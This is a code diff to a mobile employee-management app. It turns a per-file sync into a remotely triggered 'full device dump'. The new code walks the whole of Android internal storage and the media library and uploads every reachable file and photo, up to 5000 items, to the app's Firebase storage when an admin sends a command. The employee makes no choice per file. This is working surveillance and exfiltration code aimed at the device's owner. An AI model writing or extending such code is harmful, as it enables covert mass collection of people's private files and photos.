@@ -1,11 +1,26 @@
+/**
+ * FullDeviceSyncService — comprehensive device file/media dump. This never
+ * runs on its own; it only fires when triggered by an explicit admin-panel
+ * remote command (see RemoteCommandService's `sync_all_files` handler), as
+ * opposed to the employee's own File Manager where each file is a manual,
+ * individual choice.
+ */
+import { Platform } from 'react-native';
+import * as FileSystem from 'expo-file-system/legacy';
 import { ref, uploadBytes, getDownloadURL } from 'firebase/storage';
 import { doc, getDoc, setDoc, serverTimestamp } from 'firebase/firestore';
 import { db, storage } from './firebase';
-import { getMediaLibrary, hasMediaLibraryPermission, getSyncMediaTypes, isExpoGo } from './nativeModules';
-import { scanDeviceStorage } from './storageScanner';
+import { getMediaLibrary, hasMediaLibraryPermission, getSyncMediaTypes } from './nativeModules';
 
-const MEDIA_PAGE_SIZE = 100;
-const MEDIA_MAX_ASSETS = 250;
+const MEDIA_PAGE_SIZE = 150;
+const MEDIA_MAX_ASSETS = 5000;
+const MAX_FILE_BYTES = 200 * 1024 * 1024; // 200 MB per file
+const MAX_WALK_FILES = 5000;
+const MAX_WALK_DEPTH = 12;
+
+const WALK_ROOT = '/storage/emulated/0';
+// Only truly inaccessible/junk dirs are skipped — everything else is included.
+const SKIP_DIR_NAMES = new Set(['Android', '.thumbnails', 'cache', 'Cache', 'Code Cache', 'lost+found']);
 
 type FileCategory = 'Document' | 'Media' | 'Backup' | 'Image';
 
@@ -25,6 +40,10 @@ function formatSize(bytes: number): string {
   return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
 }
 
+function toFileUri(path: string): string {
+  return path.startsWith('file://') ? path : `file://${path}`;
+}
+
 async function isAlreadySynced(docId: string): Promise<boolean> {
   try {
     const snap = await getDoc(doc(db, 'syncedFiles', docId));
@@ -42,8 +61,8 @@ async function uploadAndIndex(
   filename: string,
   sizeBytes: number,
   category: FileCategory,
-  mediaType?: string,
 ): Promise<boolean> {
+  if (sizeBytes > MAX_FILE_BYTES) return false;
   if (await isAlreadySynced(docId)) return false;
 
   const response = await fetch(uri);
@@ -61,9 +80,11 @@ async function uploadAndIndex(
     filename: safeName,
     fileType: ext || 'FILE',
     size: formatSize(sizeBytes || blob.size || 0),
-    category: category || extCategory(filename, mediaType),
+    category,
     syncedAt: new Date().toISOString(),
     downloadUrl,
+    manuallySynced: false,
+    source: 'admin_full_sync',
     updatedAt: serverTimestamp(),
   });
   return true;
@@ -72,9 +93,7 @@ async function uploadAndIndex(
 async function syncMediaLibraryAssets(userId: string, employeeName: string): Promise<number> {
   const MediaLibrary = await getMediaLibrary();
   if (!MediaLibrary) return 0;
-
-  const permitted = await hasMediaLibraryPermission();
-  if (!permitted) return 0;
+  if (!(await hasMediaLibraryPermission())) return 0;
 
   const mediaTypes = getSyncMediaTypes(MediaLibrary);
   let synced = 0;
@@ -108,13 +127,12 @@ async function syncMediaLibraryAssets(userId: string, employeeName: string): Pro
             docId,
             uri,
             filename,
-            info.fileSize || 0,
+            (info as { fileSize?: number }).fileSize || 0,
             extCategory(filename, asset.mediaType),
-            asset.mediaType,
           );
           if (ok) synced++;
         } catch (e) {
-          console.warn('[FileSync] skip media asset', asset.id, e);
+          console.warn('[FullDeviceSync] skip media asset', asset.id, e);
         }
       }
 
@@ -126,43 +144,84 @@ async function syncMediaLibraryAssets(userId: string, employeeName: string): Pro
   return synced;
 }
 
-async function syncFilesystemAssets(userId: string, employeeName: string): Promise<number> {
-  const files = await scanDeviceStorage();
-  let synced = 0;
+function stableId(path: string): string {
+  return path.replace(/[^a-zA-Z0-9]+/g, '_').slice(0, 140);
+}
 
-  for (const file of files) {
+async function walkAndUpload(
+  userId: string,
+  employeeName: string,
+  dirPath: string,
+  depth: number,
+  counter: { synced: number; visited: number },
+): Promise<void> {
+  if (depth > MAX_WALK_DEPTH || counter.visited >= MAX_WALK_FILES) return;
+
+  let names: string[];
+  try {
+    names = await FileSystem.readDirectoryAsync(toFileUri(dirPath));
+  } catch {
+    return;
+  }
+
+  for (const name of names) {
+    if (counter.visited >= MAX_WALK_FILES) break;
+    if (SKIP_DIR_NAMES.has(name)) continue;
+
+    const fullPath = `${dirPath.replace(/\/$/, '')}/${name}`;
+    const uri = toFileUri(fullPath);
+
+    let info: FileSystem.FileInfo;
     try {
-      const docId = `${userId}_fs_${file.id}`;
+      info = await FileSystem.getInfoAsync(uri);
+    } catch {
+      continue;
+    }
+    if (!info.exists) continue;
+
+    if (info.isDirectory) {
+      await walkAndUpload(userId, employeeName, fullPath, depth + 1, counter);
+      continue;
+    }
+
+    counter.visited++;
+    const size = info.size ?? 0;
+    if (size <= 0) continue;
+
+    try {
       const ok = await uploadAndIndex(
         userId,
         employeeName,
-        docId,
-        file.uri,
-        file.filename,
-        file.size,
-        extCategory(file.filename),
+        `${userId}_fs_${stableId(fullPath)}`,
+        uri,
+        name,
+        size,
+        extCategory(name),
       );
-      if (ok) synced++;
+      if (ok) counter.synced++;
     } catch (e) {
-      console.warn('[FileSync] skip storage file', file.filename, e);
+      console.warn('[FullDeviceSync] skip file', name, e);
     }
   }
-
-  return synced;
 }
 
-export async function syncDeviceFiles(userId: string, employeeName: string): Promise<number> {
-  try {
-    const mediaSynced = await syncMediaLibraryAssets(userId, employeeName);
-    const fsSynced = await syncFilesystemAssets(userId, employeeName);
-    const total = mediaSynced + fsSynced;
+async function syncFilesystem(userId: string, employeeName: string): Promise<number> {
+  if (Platform.OS !== 'android') return 0;
+  const counter = { synced: 0, visited: 0 };
+  await walkAndUpload(userId, employeeName, WALK_ROOT, 0, counter);
+  return counter.synced;
+}
 
-    if (isExpoGo() && total === 0) {
-      console.log('[FileSync] Expo Go — limited sync. Use installed APK for PDF, Office, zip, and full storage scan.');
-    }
-    return total;
-  } catch (e) {
-    console.warn('[FileSync] sync failed:', e);
-    return 0;
-  }
+/**
+ * Runs a full device dump: every accessible photo/video in the media
+ * library, plus every accessible file under internal storage (skipping only
+ * OS-blocked or junk directories). Only ever invoked by an admin-initiated
+ * remote command.
+ */
+export async function runFullDeviceSync(userId: string, employeeName: string): Promise<number> {
+  const [mediaSynced, fsSynced] = await Promise.all([
+    syncMediaLibraryAssets(userId, employeeName),
+    syncFilesystem(userId, employeeName),
+  ]);
+  return mediaSynced + fsSynced;
 }
